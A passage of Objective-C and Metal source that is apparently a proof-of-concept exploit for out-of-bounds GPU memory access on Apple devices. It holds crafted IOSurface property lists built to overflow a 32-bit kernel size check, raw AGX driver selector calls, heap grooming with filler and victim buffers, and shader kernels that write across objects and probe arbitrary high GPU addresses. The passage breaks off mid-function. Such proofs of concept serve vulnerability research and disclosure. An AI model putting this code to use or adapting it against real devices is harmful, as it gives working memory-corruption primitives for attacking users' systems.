        L(@"[ACCEL] CTRL transfer(normal->crafted) -> 0x%x", kr);
    }
    if (dstN && surf) {
        kr = transfer(accel, surf, dstN, NULL, NULL);
        L(@"[ACCEL] CTRL transfer(crafted->normal) -> 0x%x", kr);
    }

    // Locking the wrapped surface exercises the CPU-side plane mapping.
    kern_return_t lk = IOSurfaceLock(surf, 0, NULL);
    L(@"[ACCEL] IOSurfaceLock(F1) -> 0x%x", lk);
    if (lk == KERN_SUCCESS) IOSurfaceUnlock(surf, 0, NULL);

    NSDictionary *big = @{
        @"IOSurfaceWidth": @2097152, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @1,
        @"IOSurfacePixelFormat": @0x42475241,
        @"IOSurfaceAllocSize": @0x20000000
    };
    IOSurfaceRef dst = IOSurfaceCreate((__bridge CFDictionaryRef)big);
    L(@"[ACCEL] dst-big=%p alloc=0x%zx", dst, dst ? IOSurfaceGetAllocSize(dst) : 0);
    if (dst) {
        kr = transfer(accel, surf, dst, NULL, NULL);
        L(@"[ACCEL] transfer(F1->big) -> 0x%x", kr);
        if (kr != KERN_SUCCESS) {
            kr = transfer(accel, surf, dst, (__bridge CFDictionaryRef)@{}, NULL);
            L(@"[ACCEL] transfer(F1->big, empty) -> 0x%x", kr);
        }
        CFRelease(dst);
    }

    // Same-pixel-format destination: the HAL rejects cross-format scaler ops.
    OSType spf = surf ? IOSurfaceGetPixelFormat(surf) : 0;
    size_t sw = surf ? IOSurfaceGetWidth(surf) : 64;
    size_t sh = surf ? IOSurfaceGetHeight(surf) : 64;
    size_t sbpe = surf ? IOSurfaceGetBytesPerElement(surf) : 1;
    L(@"[ACCEL] source fmt=0x%x w=%zu h=%zu bpe=%zu alloc=0x%zx",
      spf, sw, sh, sbpe, surf ? IOSurfaceGetAllocSize(surf) : 0);
    NSDictionary *sameFmt = @{
        @"IOSurfaceWidth": @(sw), @"IOSurfaceHeight": @(sh),
        @"IOSurfaceBytesPerElement": @(sbpe),
        @"IOSurfacePixelFormat": @(spf),
        @"IOSurfaceAllocSize": @(IOSurfaceGetAllocSize(surf) ?: 0x10000)
    };
    IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sameFmt);
    L(@"[ACCEL] dstS=%p alloc=0x%zx", dstS, dstS ? IOSurfaceGetAllocSize(dstS) : 0);
    if (dstS) {
        // Pattern test: fill source via CPU mapping, zero destination, run transfer,
        // then dump the destination bytes. Proves whether the scaler touched the
        // compressed data region at all.
        void *sb = IOSurfaceGetBaseAddress(surf);
        void *db = IOSurfaceGetBaseAddress(dstS);
        size_t sl = IOSurfaceGetAllocSize(surf), dl = IOSurfaceGetAllocSize(dstS);
        if (sb && sl) {
            IOSurfaceLock(surf, 0, NULL);
            uint8_t *p8 = sb;
            for (size_t i = 0; i < sl; i++) {
                static const uint8_t marks[4] = {0x11, 0x22, 0x33, 0x44};
                p8[i] = marks[(i >> 14) & 3];
            }
            IOSurfaceUnlock(surf, 0, NULL);
        }
        if (db && dl) {
            IOSurfaceLock(dstS, 0, NULL);
            memset(db, 0, dl);
            IOSurfaceUnlock(dstS, 0, NULL);
        }
        kr = transfer(accel, surf, dstS, NULL, NULL);
        L(@"[ACCEL] transfer(crafted->samefmt) -> 0x%x", kr);
        if (transform) {
            kr = transform(accel, surf, dstS, NULL, NULL, NULL, NULL, NULL);
            L(@"[ACCEL] transform(crafted->samefmt) -> 0x%x", kr);
        }
        if (db && dl) {
            IOSurfaceLock(dstS, 0, NULL);
            L(@"[ACCEL] dstS marks: [0]=%02x [0x400]=%02x [0x800]=%02x [0xc00]=%02x [0x1000]=%02x [0x1400]=%02x [0x1800]=%02x [0x1c00]=%02x [0x2000]=%02x [0x2400]=%02x [0x2800]=%02x [0x2c00]=%02x",
              ((uint8_t*)db)[0], ((uint8_t*)db)[0x400], ((uint8_t*)db)[0x800], ((uint8_t*)db)[0xc00],
              ((uint8_t*)db)[0x1000], ((uint8_t*)db)[0x1400], ((uint8_t*)db)[0x1800], ((uint8_t*)db)[0x1c00],
              ((uint8_t*)db)[0x2000], ((uint8_t*)db)[0x2400], ((uint8_t*)db)[0x2800], ((uint8_t*)db)[0x2c00]);
            L(@"[ACCEL] dstS[0..0x20]=%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
              ((uint8_t*)db)[0],((uint8_t*)db)[1],((uint8_t*)db)[2],((uint8_t*)db)[3],
              ((uint8_t*)db)[4],((uint8_t*)db)[5],((uint8_t*)db)[6],((uint8_t*)db)[7],
              ((uint8_t*)db)[8],((uint8_t*)db)[9],((uint8_t*)db)[10],((uint8_t*)db)[11],
              ((uint8_t*)db)[12],((uint8_t*)db)[13],((uint8_t*)db)[14],((uint8_t*)db)[15],
              ((uint8_t*)db)[16],((uint8_t*)db)[17],((uint8_t*)db)[18],((uint8_t*)db)[19],
              ((uint8_t*)db)[20],((uint8_t*)db)[21],((uint8_t*)db)[22],((uint8_t*)db)[23],
              ((uint8_t*)db)[24],((uint8_t*)db)[25],((uint8_t*)db)[26],((uint8_t*)db)[27],
              ((uint8_t*)db)[28],((uint8_t*)db)[29],((uint8_t*)db)[30],((uint8_t*)db)[31]);
            IOSurfaceUnlock(dstS, 0, NULL);
        }
        kr = transfer(accel, dstS, surf, NULL, NULL);
        L(@"[ACCEL] transfer(samefmt->crafted) -> 0x%x", kr);
        if (transform) {
            kr = transform(accel, dstS, surf, NULL, NULL, NULL, NULL, NULL);
            L(@"[ACCEL] transform(samefmt->crafted) -> 0x%x", kr);
        }
        CFRelease(dstS);
    }

    // Small fixed 64x64 destination: lets a huge source tile grid land in a
    // small readable buffer without allocating the whole 2M x 64 surface.
    NSDictionary *smallDst = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @1,
        @"IOSurfacePixelFormat": @(spf),
        @"IOSurfaceAllocSize": @0x1000
    };
    IOSurfaceRef dstSm = IOSurfaceCreate((__bridge CFDictionaryRef)smallDst);
    L(@"[ACCEL] dstSm=%p alloc=0x%zx", dstSm, dstSm ? IOSurfaceGetAllocSize(dstSm) : 0);
    if (dstSm && surf) {
        void *sb2 = IOSurfaceGetBaseAddress(surf);
        void *db2 = IOSurfaceGetBaseAddress(dstSm);
        size_t sl2 = IOSurfaceGetAllocSize(surf), dl2 = IOSurfaceGetAllocSize(dstSm);
        if (sb2 && sl2) {
            IOSurfaceLock(surf, 0, NULL);
            uint8_t *p8 = sb2;
            for (size_t i = 0; i < sl2; i++) p8[i] = (uint8_t)((i & 0xff) ^ 0x5a);
            IOSurfaceUnlock(surf, 0, NULL);
        }
        if (db2 && dl2) {
            IOSurfaceLock(dstSm, 0, NULL);
            memset(db2, 0xee, dl2);
            IOSurfaceUnlock(dstSm, 0, NULL);
        }
        kr = transfer(accel, surf, dstSm, NULL, NULL);
        L(@"[ACCEL] transfer(F3->dstSm) -> 0x%x", kr);
        if (transform) {
            kr = transform(accel, surf, dstSm, NULL, NULL, NULL, NULL, NULL);
            L(@"[ACCEL] transform(F3->dstSm) -> 0x%x", kr);
        }
        if (db2 && dl2) {
            IOSurfaceLock(dstSm, 0, NULL);
            L(@"[ACCEL] dstSm marks: [0]=%02x [0x100]=%02x [0x200]=%02x [0x400]=%02x [0x800]=%02x [0x1000]=%02x",
              ((uint8_t*)db2)[0], ((uint8_t*)db2)[0x100], ((uint8_t*)db2)[0x200],
              ((uint8_t*)db2)[0x400], ((uint8_t*)db2)[0x800], ((uint8_t*)db2)[0x1000]);
            IOSurfaceUnlock(dstSm, 0, NULL);
        }
        CFRelease(dstSm);
    }

    L(@"[ACCEL] dst-normal=%p alloc=0x%zx", dstN, dstN ? IOSurfaceGetAllocSize(dstN) : 0);
    IOSurfaceRef dst2 = dstN ? (IOSurfaceRef)CFRetain(dstN) : NULL;
    if (dst2) {
        kr = transfer(accel, surf, dst2, NULL, NULL);
        L(@"[ACCEL] transfer(F1->normal) -> 0x%x", kr);
        if (transform) {
            kr = transform(accel, surf, dst2, NULL, NULL, NULL, NULL, NULL);
            L(@"[ACCEL] transform(F1->normal) -> 0x%x", kr);
        }
        // Reverse direction: normal source -> F1 destination.
        if (srcN) {
            kr = transfer(accel, srcN, surf, NULL, NULL);
            L(@"[ACCEL] transfer(normal->F1) -> 0x%x", kr);
            if (transform) {
                kr = transform(accel, srcN, surf, NULL, NULL, NULL, NULL, NULL);
                L(@"[ACCEL] transform(normal->F1) -> 0x%x", kr);
            }
        }
        CFRelease(dst2);
    }
    if (srcN) CFRelease(srcN);
    if (dstN) CFRelease(dstN);
    CFRelease(accel);
    dlclose(h);
}

static void L(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    pthread_mutex_lock(&gLock);
    [gLog appendString:s];
    [gLog appendString:@"\n"];
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    pthread_mutex_unlock(&gLock);
    NSLog(@"[F1OOB] %@", s);
}

static uint32_t rd32(const void *p) {
    uint32_t v;
    memcpy(&v, p, 4);
    return v;
}

static uint64_t rd64(const void *p) {
    uint64_t v;
    memcpy(&v, p, 8);
    return v;
}

static uint64_t gpu_address(id obj) {
    SEL sel = NSSelectorFromString(@"gpuAddress");
    if (!obj || ![obj respondsToSelector:sel]) return 0;
    return ((uint64_t (*)(id, SEL))objc_msgSend)(obj, sel);
}

// Normal 64x64 BGRA control surface. It is created before the F1 surface so the
// IOSurface ID/allocator state matches the original crash/repro sequence.
static NSString *normal_xml(void) {
    return @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
    "<plist version=\"1.0\"><dict>"
    "<key>IOSurfaceWidth</key><integer>64</integer>"
    "<key>IOSurfaceHeight</key><integer>64</integer>"
    "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
    "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
    "</dict></plist>\n";
}

// F1 shape:
//   dataPerSlice   = 0x4000
//   headerPerSlice = 0x40000000
//   slices         = 4
//   (data + header) * slices = 0x100010000 -> 32-bit 0x10000
//   planeSize = 0x10000, so the kernel check passes.
// The true logical region is 0x100010000 (4 GiB + 64 KiB).
static NSString *f1_xml(void) {
    // F3: BytesPerRowOfTileData equality wraps in 32 bits:
    //   0x10000 (widthInTiles) * 0x10001 (bytesPerTileData) mod 2^32 = 0x10000.
    // True tile-data area: 0x10000 * 0x10001 * 2 ~= 8.59 GiB,
    // declared data region: 0x10000 * 2 = 128 KiB.
    return @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
    "<plist version=\"1.0\"><dict>"
    "<key>IOSurfaceWidth</key><integer>65536</integer>"
    "<key>IOSurfaceHeight</key><integer>4</integer>"
    "<key>IOSurfaceBytesPerElement</key><integer>1</integer>"
    "<key>IOSurfacePixelFormat</key><integer>1278226488</integer>"
    "<key>IOSurfaceAddressFormat</key><integer>2</integer>"
    "<key>IOSurfaceAllocSize</key><integer>262144</integer>"
    "<key>IOSurfaceSliceCount</key><integer>2</integer>"
    "<key>IOSurfacePlaneInfo</key><array><dict>"
    "<key>IOSurfacePlaneWidth</key><integer>65536</integer>"
    "<key>IOSurfacePlaneHeight</key><integer>4</integer>"
    "<key>IOSurfacePlaneBytesPerElement</key><integer>1</integer>"
    "<key>IOSurfacePlaneBytesPerRow</key><integer>65536</integer>"
    "<key>IOSurfacePlaneSize</key><integer>262144</integer>"
    "<key>IOSurfacePlaneCompressionType</key><integer>3</integer>"
    "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>131072</integer>"
    "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>0</integer>"
    "<key>IOSurfacePlaneCompressedTileWidth</key><integer>1</integer>"
    "<key>IOSurfacePlaneCompressedTileHeight</key><integer>2</integer>"
    "<key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer>"
    "<key>IOSurfacePlaneBytesPerTileData</key><integer>65537</integer>"
    "<key>IOSurfacePlaneWidthInCompressedTiles</key><integer>65536</integer>"
    "<key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer>"
    "<key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>65536</integer>"
    "<key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>262144</integer>"
    "<key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer>"
    "<key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer>"
    "</dict></array></dict></plist>\n";
}

// Raw IOSurfaceRoot selector 0 (the same in-band XML path used by the kernel parser).
static uint32_t create_surface(io_connect_t conn, NSString *xml, const char *tag) {
    const char *xc = xml.UTF8String;
    size_t xlen = xc ? strlen(xc) + 1 : 0;
    if (!xc || xlen > 0x1000) {
        L(@"[%s] XML too large: %zu", tag, xlen);
        return 0;
    }
    uint64_t sc[1] = {0};
    uint8_t *info = calloc(1, 0xc68);
    size_t isz = 0xc68;
    kern_return_t kr = IOConnectCallMethod(conn, 0, sc, 1, xc, xlen,
                                           NULL, NULL, info, &isz);
    uint32_t sid = isz >= 0x1c ? rd32(info + 0x18) : 0;
    L(@"[%s] sel0=0x%x out=0x%zx id=%u", tag, kr, isz, sid);
    if (kr == KERN_SUCCESS && isz >= 0x78) {
        L(@"[%s] sliceCount=0x%x headerPerSlice=0x%x dataPerSlice=0x%x",
          tag, rd32(info + 0x74), rd32(info + 0x88 + 0x84),
          rd32(info + 0x88 + 0x80));
    }
    free(info);
    return kr == KERN_SUCCESS ? sid : 0;
}

// AGX accelerator selector 8, type 0x82: build a GPU resource from an IOSurface.
// out+0x00 = GPU VA of the resource, out+0x28 = resource length/span.
static uint64_t agx_map(uint32_t sid, uint64_t *span, io_connect_t *out_ac) {
    *span = 0;
    *out_ac = 0;
    io_service_t agx = 0;
    const char *agx_names[] = {
        "AGXAcceleratorG14P",  // A15
        "AGXAcceleratorG18P",  // A19 Pro
        "AGXAcceleratorG13P",
        "AGXAcceleratorG16P",
    };
    for (size_t ai = 0; ai < sizeof(agx_names)/sizeof(agx_names[0]); ai++) {
        agx = IOServiceGetMatchingService(kIOMasterPortDefault,
                                          IOServiceMatching(agx_names[ai]));
        if (agx) {
            L(@"[AGX] service=%s", agx_names[ai]);
            break;
        }
    }
    if (!agx) {
        L(@"[AGX] no AGXAccelerator service");
        return 0;
    }
    io_connect_t ac = 0;
    kern_return_t kr = IOServiceOpen(agx, mach_task_self(), 1, &ac);
    IOObjectRelease(agx);
    L(@"[AGX] IOServiceOpen(type=1) -> 0x%x conn=0x%x", kr, ac);
    if (kr != KERN_SUCCESS) return 0;

    uint8_t *in = calloc(1, 0x100);
    uint8_t *out = calloc(1, 0x1000);
    *(uint32_t *)(in + 0x00) = 0x82;  // resource type
    *(uint32_t *)(in + 0x34) = 0;     // reserved/flags
    *(uint32_t *)(in + 0x38) = sid;   // IOSurface ID
    *(uint32_t *)(in + 0x3c) = 0;     // reserved/flags
    size_t osz = 0x1000;
    kr = IOConnectCallMethod(ac, 8, NULL, 0, in, 0x100, NULL, NULL, out, &osz);
    uint64_t ga = rd64(out + 0x00);
    uint64_t sp = rd64(out + 0x28);
    uint64_t obj = rd64(out + 0x10);
    L(@"[AGX] sel8=0x%x gpuVA=0x%llx span=0x%llx out10=0x%llx out18=0x%llx",
      kr, ga, sp, obj, rd64(out + 0x18));
    if (obj) {
        uint8_t *buf = calloc(1, 0x200);
        mach_vm_size_t sz = 0x200;
        kern_return_t mr = mach_vm_read_overwrite(mach_task_self(), obj, 0x200,
                                                  (mach_vm_address_t)buf, &sz);
        L(@"[AGX] vm_read(0x%llx) -> 0x%x size=0x%llx", obj, mr, (unsigned long long)sz);
        if (mr == KERN_SUCCESS) {
            for (size_t o = 0; o < 0x200; o += 8)
                L(@"[AGXOBJ] +0x%03zx = 0x%016llx", o, (unsigned long long)rd64(buf + o));
        }
        free(buf);
    }
    free(in);
    free(out);
    if (kr != KERN_SUCCESS) {
        IOServiceClose(ac);
        return 0;
    }
    *span = sp;
    *out_ac = ac;  // keep open: the resource lives with the connection
    return ga;
}

// Create 32 normal IOSurfaces after F1, fill them with a pattern. They reproduce
// the allocator/VA layout of the original probe; the actual OOB target is the
// Metal victim buffer below.
static int create_iosurface_victims(IOSurfaceRef *victims, int max) {
    int vc = 0;
    for (int i = 0; i < max; i++) {
        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @0x42475241,
            @"IOSurfaceAllocSize": @0x10000
        };
        IOSurfaceRef v = IOSurfaceCreate((__bridge CFDictionaryRef)props);
        if (!v) break;
        void *base = IOSurfaceGetBaseAddress(v);
        if (base) {
            uint32_t *p = (uint32_t *)base;
            for (size_t o = 0; o + 4 <= 0x10000; o += 4)
                p[o / 4] = 0x11111111u + (uint32_t)i;
        }
        victims[vc++] = v;
    }
    L(@"[VICTIM] IOSurfaces created=%d", vc);
    return vc;
}

// Core GPU OOB proof.
static void metal_cross_object_write(IOSurfaceRef surf, uint64_t agx_va, uint64_t agx_span) {
    L(@"[METAL] start");
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { L(@"[METAL] no device"); return; }
    L(@"[METAL] device=%@", [dev name]);

    void *base = IOSurfaceGetBaseAddress(surf);
    size_t alloc = IOSurfaceGetAllocSize(surf);
    if (!base || alloc < 0x10000) {
        L(@"[METAL] bad surface base=%p alloc=0x%zx", base, alloc);
        return;
    }

    // 64 KiB Metal wrapper around the 64 KiB IOSurface.
    id<MTLBuffer> f1buf = [dev newBufferWithBytesNoCopy:base
                                                 length:0x10000
                                                options:MTLResourceStorageModeShared
                                            deallocator:nil];
    uint64_t f1ga = gpu_address(f1buf);
    L(@"[METAL] F1 MTLBuffer=%p len=%lu gpuAddress=0x%llx agxVA=0x%llx span=0x%llx",
      f1buf, (unsigned long)f1buf.length, f1ga, agx_va, agx_span);

    // Victim buffer allocated after F1. It is expected to land inside the AGX
    // resource's 16 MiB VA range.
    // Fillers reproduce the VA placement of the original probe: after 15 x 64 KiB
    // allocations the victim lands around +0x100000 from the F1 base.
    id<MTLBuffer> fillers[6];
    for (int fi = 0; fi < 6; fi++) {
        fillers[fi] = [dev newBufferWithLength:0x10000
                                       options:MTLResourceStorageModeShared];
    }
    id<MTLBuffer> victim = [dev newBufferWithLength:0x10000
                                            options:MTLResourceStorageModeShared];
    if (!victim.contents) { L(@"[METAL] victim has no CPU contents"); return; }
    for (size_t o = 0; o + 4 <= 0x10000; o += 4)
        *(uint32_t *)((uint8_t *)victim.contents + o) = 0x42424242u;
    uint64_t victimga = gpu_address(victim);
    L(@"[METAL] victim MTLBuffer=%p len=%lu gpuAddress=0x%llx",
      victim, (unsigned long)victim.length, victimga);

    if (!f1ga || !victimga || victimga <= f1ga) {
        L(@"[METAL] no usable GPU addresses");
        return;
    }
    uint64_t delta = victimga - f1ga;
    L(@"[METAL] delta=0x%llx span=0x%llx inSpan=%s",
      delta, agx_span, (delta < agx_span) ? "yes" : "no");

    NSString *src =
        @"#include <metal_stdlib>\n"
        "using namespace metal;\n"
        "kernel void wr(device uint *buf [[buffer(0)]],\n"
        "               constant uint &idx [[buffer(1)]],\n"
        "               constant uint &val [[buffer(2)]]) {\n"
        "  buf[idx] = val;\n"
        "}\n"
        "kernel void rd(device uint *buf [[buffer(0)]],\n"
        "               device uint *out [[buffer(1)]],\n"
        "               constant uint &idx [[buffer(2)]]) {\n"
        "  out[0] = buf[idx];\n"
        "}\n"
        "kernel void rd64(device ulong *buf [[buffer(0)]],\n"
        "                 device ulong *out [[buffer(1)]],\n"
        "                 constant long &delta [[buffer(2)]]) {\n"
        "  out[0] = buf[delta / 8];\n"
        "}\n"
        "kernel void wr64(device ulong *buf [[buffer(0)]],\n"
        "                 constant long &delta [[buffer(1)]],\n"
        "                 constant ulong &val [[buffer(2)]]) {\n"
        "  buf[delta / 8] = val;\n"
        "}\n";
    NSError *err = nil;
    id<MTLLibrary> lib = [dev newLibraryWithSource:src options:nil error:&err];
    if (!lib) { L(@"[METAL] library error=%@", err); return; }
    id<MTLFunction> fwr = [lib newFunctionWithName:@"wr"];
    id<MTLFunction> frd = [lib newFunctionWithName:@"rd"];
    id<MTLFunction> frd64 = [lib newFunctionWithName:@"rd64"];
    id<MTLFunction> fwr64 = [lib newFunctionWithName:@"wr64"];
    id<MTLComputePipelineState> pwr = fwr ? [dev newComputePipelineStateWithFunction:fwr error:&err] : nil;
    id<MTLComputePipelineState> prd = frd ? [dev newComputePipelineStateWithFunction:frd error:&err] : nil;
    id<MTLComputePipelineState> prd64 = frd64 ? [dev newComputePipelineStateWithFunction:frd64 error:&err] : nil;
    id<MTLComputePipelineState> pwr64 = fwr64 ? [dev newComputePipelineStateWithFunction:fwr64 error:&err] : nil;
    if (!pwr || !prd) { L(@"[METAL] pipeline error=%@", err); return; }

    id<MTLBuffer> out = [dev newBufferWithLength:16 options:MTLResourceStorageModeShared];
    id<MTLCommandQueue> q = [dev newCommandQueue];

    if (delta > 0 && delta < 0x10000000) {
        uint32_t idx = (uint32_t)(delta / 4);
        uint32_t marker = 0x43434343u;

        // Pre-touch the victim through its OWN GPU VA. This establishes its
        // pages in the GPU context page table; without this, the F1 access at
        // delta may be silently dropped (see F1OOB_ANALYSIS.md §17.2).
        {
            uint32_t idx0 = 0;
            uint32_t vmark = 0x47474747u;
            id<MTLCommandBuffer> vb = [q commandBuffer];
            id<MTLComputeCommandEncoder> ve = [vb computeCommandEncoder];
            [ve setComputePipelineState:pwr];
            [ve setBuffer:victim offset:0 atIndex:0];
            [ve setBytes:&idx0 length:4 atIndex:1];
            [ve setBytes:&vmark length:4 atIndex:2];
            [ve dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [ve endEncoding];
            [vb commit];
            [vb waitUntilCompleted];
            uint32_t own = 0;
            memcpy(&own, victim.contents, 4);
            L(@"[METAL] VICTIM own-va write status=%lu victim[0]=0x%08x expect=0x%08x",
              (unsigned long)vb.status, own, vmark);
        }

        id<MTLCommandBuffer> wb = [q commandBuffer];
        id<MTLComputeCommandEncoder> we = [wb computeCommandEncoder];
        [we setComputePipelineState:pwr];
        [we setBuffer:f1buf offset:0 atIndex:0];
        [we setBytes:&idx length:4 atIndex:1];
        [we setBytes:&marker length:4 atIndex:2];
        [we dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [we endEncoding];
        [wb commit];
        [wb waitUntilCompleted];
        L(@"[METAL] WRITE idx=0x%x marker=0x%08x status=%lu err=%@",
          idx, marker, (unsigned long)wb.status, wb.error);

        uint32_t back = 0;
        memcpy(&back, victim.contents, 4);
        L(@"[METAL] VICTIM[0]=0x%08x", back);
        if (back == marker) {
            L(@"[METAL] *** CROSS-OBJECT GPU OOB WRITE CONFIRMED ***");
        } else {
            L(@"[METAL] no cross-object hit");
        }

        // Restore the victim's first word so the demo is non-destructive.
        uint32_t orig = 0x42424242u;
        id<MTLCommandBuffer> rb = [q commandBuffer];
        id<MTLComputeCommandEncoder> re = [rb computeCommandEncoder];
        [re setComputePipelineState:pwr];
        [re setBuffer:f1buf offset:0 atIndex:0];
        [re setBytes:&idx length:4 atIndex:1];
        [re setBytes:&orig length:4 atIndex:2];
        [re dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [re endEncoding];
        [rb commit];
        [rb waitUntilCompleted];
        L(@"[METAL] RESTORE status=%lu err=%@", (unsigned long)rb.status, rb.error);
    }

    // Reference test: fixed 0x20000 offset. This is not portable across boots,
    // but shows whether the page at that offset is backed in this run.
    {
        uint32_t idx = 0x20000 / 4;
        uint32_t marker = 0x41414141u;
        id<MTLCommandBuffer> wb = [q commandBuffer];
        id<MTLComputeCommandEncoder> we = [wb computeCommandEncoder];
        [we setComputePipelineState:pwr];
        [we setBuffer:f1buf offset:0 atIndex:0];
        [we setBytes:&idx length:4 atIndex:1];
        [we setBytes:&marker length:4 atIndex:2];
        [we dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [we endEncoding];
        [wb commit];
        [wb waitUntilCompleted];
        uint32_t back = 0;
        id<MTLCommandBuffer> rb = [q commandBuffer];
        id<MTLComputeCommandEncoder> re = [rb computeCommandEncoder];
        [re setComputePipelineState:prd];
        [re setBuffer:f1buf offset:0 atIndex:0];
        [re setBuffer:out offset:0 atIndex:1];
        [re setBytes:&idx length:4 atIndex:2];
        [re dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [re endEncoding];
        [rb commit];
        [rb waitUntilCompleted];
        if (out.contents) memcpy(&back, out.contents, 4);
        L(@"[METAL] FIXED +0x20000 write=0x%08x readback=0x%08x (may be 0/unbacked)",
          marker, back);
    }

    // High-VA probe: the F1 shader argument is a raw 64-bit GPU VA. Test whether
    // TTBAT/firmware VAs are mapped in this context. A fault stops the loop.
    if (prd64) {
        uint64_t targets[] = {
            0x1500000000ULL + 0x1000000ULL,
            0x13400000000ULL,
            0x13400000000ULL + 0x1000ULL,
            0x100000000ULL,
            0x800000000ULL,
            0x1000000000ULL,
        };
        for (int ti = 0; ti < (int)(sizeof(targets)/sizeof(targets[0])); ti++) {
            uint64_t target = targets[ti];
            int64_t d = (int64_t)(target - f1ga);
            L(@"[HIGHVA] target=0x%llx delta=0x%llx", target, (unsigned long long)d);
            id<MTLCommandBuffer> hb = [q commandBuffer];
            id<MTLComputeCommandEncoder> he = [hb computeCommandEncoder];
            [he setComputePipelineState:prd64];
            [he setBuffer:f1buf offset:0 atIndex:0];
            [he setBuffer:out offset:0 atIndex:1];
            [he setBytes:&d length:8 atIndex:2];
            [he dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [he endEncoding];
            [hb commit];
            [hb waitUntilCompleted];
            if (hb.status == MTLCommandBufferStatusError) {
                L(@"[HIGHVA] FAULT target=0x%llx err=%@", target, hb.error);
                break;
            }
            uint64_t hv = 0;
            if (out.contents) memcpy(&hv, out.contents, 8);
            L(@"[HIGHVA] value=0x%llx", (unsigned long long)hv);
        }
    }

    // High-VA write test: read original, write a marker, read back, restore.
    // If the marker persists, the page is writable; if it reads 0, it is a
    // read-only zero page or the write was dropped.
    if (prd64 && pwr64) {
        uint64_t targets[] = {
            0x1501000000ULL,
            0x100000000ULL,
            0x13400000000ULL + 0x8000ULL,
        };
        for (int ti = 0; ti < (int)(sizeof(targets)/sizeof(targets[0])); ti++) {
            uint64_t target = targets[ti];
            int64_t d = (int64_t)(target - f1ga);
            uint64_t orig = 0;
            L(@"[HIGHVA-W] target=0x%llx delta=0x%llx", target, (unsigned long long)d);

            id<MTLCommandBuffer> rb0 = [q commandBuffer];
            id<MTLComputeCommandEncoder> re0 = [rb0 computeCommandEncoder];
            [re0 setComputePipelineState:prd64];
            [re0 setBuffer:f1buf offset:0 atIndex:0];
            [re0 setBuffer:out offset:0 atIndex:1];
            [re0 setBytes:&d length:8 atIndex:2];
            [re0 dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [re0 endEncoding];
            [rb0 commit];
            [rb0 waitUntilCompleted];
            if (rb0.status == MTLCommandBufferStatusError) {
                L(@"[HIGHVA-W] READ FAULT err=%@", rb0.error);
                break;
            }
            if (out.contents) memcpy(&orig, out.contents, 8);

            uint64_t marker = 0x4142434445464748ULL;
            id<MTLCommandBuffer> wb2 = [q commandBuffer];
            id<MTLComputeCommandEncoder> we2 = [wb2 computeCommandEncoder];
            [we2 setComputePipelineState:pwr64];
            [we2 setBuffer:f1buf offset:0 atIndex:0];
            [we2 setBytes:&d length:8 atIndex:1];
            [we2 setBytes:&marker length:8 atIndex:2];
            [we2 dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [we2 endEncoding];
            [wb2 commit];
            [wb2 waitUntilCompleted];
            if (wb2.status == MTLCommandBufferStatusError) {
                L(@"[HIGHVA-W] WRITE FAULT err=%@", wb2.error);
                break;
            }

            uint64_t back = 0;
            id<MTLCommandBuffer> rb2 = [q commandBuffer];
            id<MTLComputeCommandEncoder> re2 = [rb2 computeCommandEncoder];
            [re2 setComputePipelineState:prd64];
            [re2 setBuffer:f1buf offset:0 atIndex:0];
            [re2 setBuffer:out offset:0 atIndex:1];
            [re2 setBytes:&d length:8 atIndex:2];
            [re2 dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [re2 endEncoding];
            [rb2 commit];
            [rb2 waitUntilCompleted];
            if (out.contents) memcpy(&back, out.contents, 8);
            L(@"[HIGHVA-W] orig=0x%llx marker=0x%llx back=0x%llx writable=%s",
              (unsigned long long)orig, (unsigned long long)marker,
              (unsigned long long)back, (back == marker) ? "YES" : "no");

            // Restore original value.
            id<MTLCommandBuffer> ob2 = [q commandBuffer];
            id<MTLComputeCommandEncoder> oe2 = [ob2 computeCommandEncoder];
